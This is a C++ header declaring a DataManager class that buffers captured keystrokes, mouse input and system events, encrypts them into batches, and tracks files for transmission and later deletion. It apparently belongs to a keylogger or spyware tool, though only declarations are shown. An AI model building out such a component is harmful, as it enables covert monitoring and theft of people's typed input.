#ifndef DATAMANAGER_H
#define DATAMANAGER_H

#include "data/KeyData.h"
#include "data/SystemData.h"
#include <string>
#include <vector>
#include <mutex>
#include <chrono>
    
struct MouseData;
struct SystemEventData;

class Configuration;

class DataManager {
public:
    explicit DataManager(Configuration* config);
    ~DataManager();
    
    void AddKeyData(const KeyData& keyData);
    void AddMouseData(const MouseData& mouseData);
    void AddSystemData(const SystemInfo& systemInfo);
    void AddSystemEventData(const SystemEventData& eventData);
    
    std::vector<uint8_t> RetrieveEncryptedData();
    void ClearData();
    bool HasData() const;
    
    // Batch collection methods
    void StartBatchCollection();
    bool IsBatchReady() const;
    std::vector<uint8_t> GetBatchData();
    
private:
    Configuration* m_config;
    std::wstring m_storagePath;
    std::wstring m_currentDataFile;
    size_t m_maxBufferSize;
    
    mutable std::mutex m_dataMutex;
    std::string m_keyDataBuffer;
    std::string m_mouseDataBuffer;
    std::string m_systemDataBuffer;
    std::string m_systemEventBuffer;
    
    // Batch collection members
    std::chrono::steady_clock::time_point m_batchStartTime;
    std::vector<uint8_t> m_batchData;
    
    void InitializeStorage();
    void FlushAllData();
    void FlushKeyData();
    void FlushMouseData();
    void FlushSystemData();
    void FlushSystemEvents();
    void AppendToFile(const std::wstring& path, const std::string& data);
    void RotateDataFileIfNeeded();
    void RotateDataFile();
    
    std::vector<std::wstring> GetDataFilesReadyForTransmission() const;
    void MarkFileAsTransmitted(const std::wstring& filePath);
    void ScheduleFileDeletion(const std::wstring& filePath, uint64_t delayMs);
    
    std::string KeyDataToString(const KeyData& data) const;
    std::string MouseDataToString(const MouseData& data) const;
    std::string SystemInfoToString(const SystemInfo& info) const;
    std::string SystemEventToString(const SystemEventData& event) const;
    std::string GenerateBatchId() const;
};

#endif